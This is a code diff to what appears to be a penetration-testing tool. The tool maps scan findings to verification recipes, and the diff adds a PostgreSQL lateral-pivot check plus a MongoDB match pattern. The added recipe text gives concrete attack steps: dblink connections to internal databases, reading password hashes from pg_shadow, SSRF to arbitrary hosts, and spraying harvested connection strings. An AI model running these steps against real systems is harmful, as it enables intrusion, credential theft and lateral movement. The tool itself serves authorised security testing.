@@ -385,6 +385,16 @@ def _v_postgres(host, port, vuln):
             "Pull the full rows within ROE: psql '...' -c 'SELECT * FROM "
             "<schema>.<table> LIMIT 100'; spray any harvested connection strings.",
             "FP only if the columns hold non-sensitive data despite their names."]
+    if "lateral pivot" in b or "dblink" in b or "postgres_fdw" in b:
+        return CONFIRMED, [
+            "recce read the extension catalog and found dblink/postgres_fdw reachable "
+            "(installed, or available to a superuser), and/or configured foreign servers "
+            "- the DB can open OUTBOUND connections to internal hosts (directly observed).",
+            "Pivot within ROE: SELECT dblink_connect('h','host=<internal-db> user=postgres "
+            "dbname=postgres'); then dblink('h','SELECT usename,passwd FROM pg_shadow'). "
+            "Also SSRF arbitrary host:port and reach services unreachable from your box.",
+            "FP only if the role can neither use nor create the extension and no foreign "
+            "server is configured."]
     if "trust auth" in b:
         return CONFIRMED, [
             "recce completed a v3 startup for 'postgres' with NO password - the server "
@@ -1047,7 +1057,8 @@ _RECIPES: list[dict] = [
      "fn": _v_snmp},
     {"id": "mongodb-unauth",
      "match": r"mongodb exposed without authentication|mongodb.*(no auth|unauth)|"
-              r"mongodb end-of-life|mongodb.*legacy build",
+              r"mongodb end-of-life|mongodb.*legacy build|"
+              r"mongodb replica-set member exposed",
      "name": "MongoDB exposed without authentication",
      "pre": ["MongoDB (27017-27019) reachable", "listDatabases answered with no credential"],
      "finish": "mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({listDatabases:1})' "
@@ -1088,6 +1099,14 @@ _RECIPES: list[dict] = [
      "finish": "psql '...' -c 'SELECT * FROM <schema>.<table> LIMIT 100' to pull the full "
                "rows; spray harvested connection strings (within ROE).",
      "fp": "The flagged columns hold non-sensitive data despite their names.",
+     "fn": _v_postgres},
+    {"id": "postgres-pivot",
+     "match": r"postgresql lateral pivot|dblink / postgres_fdw",
+     "name": "PostgreSQL lateral pivot (dblink / postgres_fdw)",
+     "pre": ["A working DB session", "dblink/postgres_fdw reachable or a foreign server"],
+     "finish": "SELECT dblink_connect('h','host=<internal-db> ...'); dblink('h','SELECT "
+               "...') to reach internal DBs; SSRF arbitrary host:port (within ROE).",
+     "fp": "The role can't use/create the extension and no foreign server is configured.",
      "fn": _v_postgres},
     {"id": "postgres-access",
      "match": r"postgresql trust authentication|postgresql credentialed access",
